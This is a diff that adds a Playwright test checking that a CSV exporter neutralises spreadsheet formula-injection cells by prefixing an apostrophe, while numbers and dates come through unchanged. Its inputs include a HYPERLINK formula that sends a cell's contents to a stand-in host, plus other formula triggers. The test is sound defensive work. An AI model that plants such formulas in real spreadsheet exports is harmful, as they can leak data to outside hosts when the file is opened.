@@ -46,6 +46,20 @@ test.describe('Phase 6 — hardening (adversarial-review fixes)', () => {
     expect(r.warnings.join(' ')).toMatch(/stray double-quote/);
   });
 
+  test('CSV: exports neutralise formula cells; numbers, dates and the mock round trip are unchanged', async ({ page }) => {
+    await page.goto(ARTIFACT);
+    const r = await page.evaluate(() => {
+      const out = CSV.serialize(['A'], [['=HYPERLINK("http://x.invalid/?"&A2,"open")'], ['+x'], ['-2+3'], ['@SUM(1)'], ['\t=1'], ['\r=1'],
+        ['-5'], ['+3'], ['2.5'], ['-1.2e3'], [-7], ['30-06-2025'], ['Name']]);
+      const back = CSV.parse(out).rows.map((row) => row[0]);
+      const mock = [...Mock.toCSVs().values()];
+      return { back, mockApostrophes: mock.reduce((s, t) => s + CSV.parse(t).rows.flat().filter((v) => String(v).startsWith("'")).length, 0) };
+    });
+    expect(r.back).toEqual([`'=HYPERLINK("http://x.invalid/?"&A2,"open")`, "'+x", "'-2+3", "'@SUM(1)", "'\t=1", "'\r=1",
+      '-5', '+3', '2.5', '-1.2e3', '-7', '30-06-2025', 'Name']);
+    expect(r.mockApostrophes).toBe(0);
+  });
+
   test('CORRECTNESS: duplicate employee_master rows are not double-counted in headcount', async ({ page }) => {
     await page.goto(ARTIFACT);
     const dupCsv = [
